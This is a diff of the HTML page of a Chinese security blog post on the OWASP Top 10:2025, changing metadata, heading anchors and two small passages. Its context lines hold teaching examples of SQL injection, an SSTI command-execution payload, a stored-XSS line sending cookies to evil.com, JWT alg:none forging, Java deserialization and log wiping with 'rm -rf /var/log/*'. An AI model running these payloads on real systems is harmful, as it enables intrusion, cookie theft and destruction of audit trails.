@@ -28,7 +28,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/OWASP-TOP-10-2025/TOP_10_logo_Final_Logo_Colour.png">
 <meta property="article:published_time" content="2026-07-08T03:15:38.000Z">
-<meta property="article:modified_time" content="2026-07-08T03:18:47.909Z">
+<meta property="article:modified_time" content="2026-07-08T03:35:16.248Z">
 <meta property="article:author" content="Infernity">
 <meta property="article:tag" content="WEB安全">
 <meta name="twitter:card" content="summary_large_image">
@@ -239,7 +239,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5.8k 字
+          5.7k 字
         
       </span>
     
@@ -250,7 +250,7 @@
         
         
         
-          49 分钟
+          48 分钟
         
       </span>
     
@@ -701,7 +701,7 @@
 <li><strong>XSS 跨站脚本</strong>（CWE-79）：反射型、存储型、DOM 型</li>
 <li><strong>模板注入</strong>（SSTI）：服务端模板引擎执行用户输入的表达式</li>
 </ul>
-<h3 id="攻击场景（结合实战）"><a href="#攻击场景（结合实战）" class="headerlink" title="攻击场景（结合实战）"></a>攻击场景（结合实战）</h3><p><strong>场景 1：经典 SQL 注入</strong></p>
+<h3 id="攻击场景-4"><a href="#攻击场景-4" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：经典 SQL 注入</strong></p>
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/products?category=Gifts&#x27;+OR+1=1--</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>example.com<br></code></pre></td></tr></table></figure>
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 危险的字符串拼接</span><br><span class="hljs-type">String</span> <span class="hljs-variable">query</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM products WHERE category = &#x27;&quot;</span> + request.getParameter(<span class="hljs-string">&quot;category&quot;</span>) + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br><span class="hljs-type">Statement</span> <span class="hljs-variable">stmt</span> <span class="hljs-operator">=</span> connection.createStatement();<br><span class="hljs-type">ResultSet</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> stmt.executeQuery(query);<br></code></pre></td></tr></table></figure>
@@ -711,7 +711,6 @@
 
 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/hello?name=&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span> <span class="hljs-meta">HTTP/1.1</span><br></code></pre></td></tr></table></figure>
 
-<p>正如之前在 <a target="_blank" rel="noopener" href="https://infernity.top/2024/11/09/2024%E9%B9%8F%E5%9F%8E%E6%9D%AFweb%E5%85%A8wp/">2024 鹏城杯 python 口算题</a> 中遇到的场景，SSTI 往往能直接 RCE。</p>
 <p><strong>场景 3：XSS 存储型</strong></p>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 评论框中输入后被直接渲染到页面 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://evil.com/steal?cookie=&#x27;</span> + <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>);</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
@@ -771,7 +770,7 @@
 <li><strong>默认不安全</strong>：系统默认配置开放所有功能，用户需要手动关闭</li>
 <li><strong>缺少速率限制</strong>：登录、API 调用未限制频率，放任暴力破解和 DDoS</li>
 </ul>
-<h3 id="攻击场景-4"><a href="#攻击场景-4" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：密码重置的”先改密码再验证”设计缺陷</strong></p>
+<h3 id="攻击场景-5"><a href="#攻击场景-5" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：密码重置的”先改密码再验证”设计缺陷</strong></p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. 用户输入邮箱 → <span class="hljs-number">2</span>. 发送重置链接 → <span class="hljs-number">3</span>. 用户点击链接 → <span class="hljs-number">4</span>. 输入新密码<br></code></pre></td></tr></table></figure>
 
 <p>如果第 4 步不需要有效的重置 Token，攻击者可以直接调用 API 修改任何人密码。</p>
@@ -833,7 +832,7 @@
 <li><strong>不安全的 JWT 处理</strong>：使用 <code>alg: none</code> 或弱签名密钥</li>
 <li><strong>账户枚举</strong>：登录失败时返回不同错误信息，可枚举有效用户名</li>
 </ul>
-<h3 id="攻击场景-5"><a href="#攻击场景-5" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：JWT <code>alg: none</code> 攻击</strong></p>
+<h3 id="攻击场景-6"><a href="#攻击场景-6" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：JWT <code>alg: none</code> 攻击</strong></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><br><span class="hljs-comment"># 攻击者将算法改为 &quot;none&quot;，绕过签名验证</span><br>token = jwt.encode(&#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>&#125;, key=<span class="hljs-string">&quot;&quot;</span>, algorithm=<span class="hljs-string">&quot;none&quot;</span>)<br><span class="hljs-comment"># 如果服务端未正确限制算法白名单，此 token 将被接受</span><br></code></pre></td></tr></table></figure>
 
 <p><strong>场景 2：账户枚举</strong></p>
@@ -896,7 +895,7 @@
 <li><strong>未签名的更新机制</strong>：软件自动更新时未验证更新包的签名</li>
 <li><strong>第三方 CDN 脚本</strong>：从前端加载的 JS 库未使用 Subresource Integrity (SRI)</li>
 </ul>
-<h3 id="攻击场景（结合实战）-1"><a href="#攻击场景（结合实战）-1" class="headerlink" title="攻击场景（结合实战）"></a>攻击场景（结合实战）</h3><p><strong>场景 1：Java 原生反序列化</strong></p>
+<h3 id="攻击场景-7"><a href="#攻击场景-7" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：Java 原生反序列化</strong></p>
 <p>这其实就是我最常写的领域。正如 <a target="_blank" rel="noopener" href="https://infernity.top/2025/03/13/C3P0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">C3P0 反序列化</a>、<a target="_blank" rel="noopener" href="https://infernity.top/2025/03/03/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Hessian 反序列化</a>、<a target="_blank" rel="noopener" href="https://infernity.top/categories/JAVA/">CC 链系列</a> 中所分析的，一条完整的反序列化利用链通常包含多个组件协同工作：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 攻击者构造恶意的序列化 payload</span><br><span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(maliciousBytes);<br><span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>ois.readObject();  <span class="hljs-comment">// 触发链子，执行任意代码</span><br></code></pre></td></tr></table></figure>
 
@@ -961,7 +960,7 @@
 <li>日志存储不安全，可被攻击者删除或篡改</li>
 <li>日志处理存在注入漏洞（如 Log4Shell 就是日志注入导致的 RCE）</li>
 </ul>
-<h3 id="攻击场景-6"><a href="#攻击场景-6" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：日志被删除</strong></p>
+<h3 id="攻击场景-8"><a href="#攻击场景-8" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：日志被删除</strong></p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"># 攻击者在 <span class="hljs-keyword">SQL</span> 注入获取数据后<br><span class="hljs-keyword">DELETE</span> <span class="hljs-keyword">FROM</span> audit_logs <span class="hljs-keyword">WHERE</span> user_id = <span class="hljs-string">&#x27;attacker&#x27;</span>;<br># 或者直接清空系统日志<br>rm -rf /var/<span class="hljs-keyword">log</span><span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>
 
 <p>如果日志仅存在本地且没有实时转发到集中日志平台，被清理后就永远无法溯源。</p>
@@ -1023,7 +1022,7 @@
 <li><strong>竞态条件（Race Condition）</strong>：TOCTOU（Time-of-Check Time-of-Use）问题</li>
 <li><strong>错误消息泄露敏感信息</strong>：系统出错时暴露数据库结构、代码路径、堆栈跟踪</li>
 </ul>
-<h3 id="攻击场景-7"><a href="#攻击场景-7" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：Fail Open 认证绕过</strong></p>
+<h3 id="攻击场景-9"><a href="#攻击场景-9" class="headerlink" title="攻击场景"></a>攻击场景</h3><p><strong>场景 1：Fail Open 认证绕过</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 危险：异常情况下认证被跳过</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">authenticate</span><span class="hljs-params">(String token)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> thirdPartyAuthService.verify(token);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(<span class="hljs-string">&quot;Auth service error: &quot;</span> + e.getMessage());<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;  <span class="hljs-comment">// 错误！Fail Open！认证服务挂了就放行！</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>如果第三方认证服务暂时不可用，系统直接认为所有用户都通过了认证。</p>
@@ -1074,9 +1073,6 @@
 <li><strong>传统 Web 问题在减少但未消失</strong>：注入、认证失效等传统问题排名虽然下降，但在缺乏安全框架的遗留系统中仍然遍地都是。</li>
 <li><strong>根本原因分类法更成熟</strong>：SSRF 归入 A01、XXE 归入 A02，体现了工程思维的进步。</li>
 </ol>
-<h2 id="更新说明"><a href="#更新说明" class="headerlink" title="更新说明"></a>更新说明</h2><blockquote>
-<p>本文数据已按 OWASP 官方 <strong>Top 10:2025</strong> 页面更新。主要更新包括：A03～A10 的 Score table、A08&#x2F;A09 官方英文名称、方法论中的数据年份口径，以及 A03 社区调查描述。</p>
-</blockquote>
 <hr>
 <p>参考文章：</p>
 <p><a target="_blank" rel="noopener" href="https://owasp.org/Top10/2025/0x00_2025-Introduction/">https://owasp.org/Top10/2025/0x00_2025-Introduction/</a></p>
